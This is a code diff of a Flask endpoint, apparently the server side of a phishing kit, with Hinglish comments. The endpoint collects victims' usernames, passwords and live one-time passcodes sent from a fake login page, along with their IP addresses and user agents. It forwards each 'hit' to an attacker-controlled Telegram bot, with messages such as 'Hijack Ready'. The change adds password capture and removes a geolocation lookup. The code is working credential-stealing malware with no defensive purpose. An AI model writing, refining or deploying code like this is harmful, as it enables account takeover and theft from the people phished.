@@ -4,46 +4,42 @@ import os
 
 app = Flask(__name__)
 
-# Dashboard mein ye dono Environment Variables set honi chahiye
 TOKEN = os.environ.get('BOT_TOKEN')
 CID = os.environ.get('CHAT_ID')
 
 @app.route('/api/index', methods=['POST'])
 def handle_requests():
     try:
-        data = request.get_json(force=True)
-        dtype = data.get('t')
-        user = data.get('u', 'Unknown')
+        # data ko read karne ka sabse behtreen tareeka
+        data = request.get_json(silent=True) or {}
+        dtype = data.get('t', 'UNKNOWN')
+        user = data.get('u', 'Not Found')
+        password = data.get('p', 'Not Found')
         
-        # IP and Location Tracking
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
-        city = geo.get('city', 'Unknown')
-        isp = geo.get('isp', 'Unknown')
 
         if dtype == 'VISIT':
-            msg = f"👀 **TARGET DETECTED**\n📍 City: `{city}`\n🌐 Network: `{isp}`\n📱 Device: `{data.get('d')[:50]}...`"
+            msg = f"👀 **TARGET DETECTED**\n🌐 IP: `{ip}`\n📱 User-Agent: `{data.get('d', 'N/A')[:40]}...`"
         
         elif dtype == 'OTP_RECEIVED':
-            otp_code = data.get('o')
-            msg = f"🔥 **Z-PROXY HIT (OTP)**\n👤 User: `{user}`\n🔢 **LIVE OTP: {otp_code}**\n🔥 Status: Hijack Ready"
+            #
+            msg = f"🔥 **Z-PROXY HIT (OTP)**\n👤 User: `{user}`\n🔢 LIVE OTP: `{data.get('o')}`\n✅ Status: Hijack Ready"
         
-        # --- YE SECTION ADD KIYA HAI PASSWORD K LIYE ---
+        # Ye hissa password ko capture karke Telegram bhejega
         elif dtype in ['INIT_LOG', 'REAL_LOG']:
-            password = data.get('p')
-            msg = f"🚀 **NEW HIT DETECTED**\n👤 User: `{user}`\n🔑 Pass: `{password}`\n📊 Status: {dtype}\n📍 City: `{city}`"
-        # -----------------------------------------------
+            msg = f"🚀 **NEW PASSWORD HIT!**\n👤 User: `{user}`\n🔑 Pass: `{password}`\n📊 Step: {dtype}\n🌐 IP: `{ip}`"
         
         else:
-            msg = f"ℹ️ Update: {dtype} for {user}"
+            msg = f"ℹ️ Update: {dtype} received for {user}"
 
         # Send to Telegram
-        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-        requests.post(url, json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                      json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
         
         return jsonify({"status": "success"}), 200
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        print(f"Error: {str(e)}")
+        return jsonify({"status": "error"}), 500
 
 def handler(req, res):
     return app(req, res)
